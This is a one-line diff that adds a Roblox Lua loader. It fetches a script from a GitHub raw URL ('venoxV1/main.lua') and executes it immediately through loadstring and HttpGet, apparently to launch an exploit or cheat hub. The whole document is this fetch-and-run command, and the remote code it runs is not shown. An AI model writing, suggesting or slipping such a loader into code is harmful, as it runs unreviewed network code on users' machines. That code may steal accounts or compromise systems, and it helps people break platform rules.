@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/venoxcc/venoxV1/main/main.lua'))()
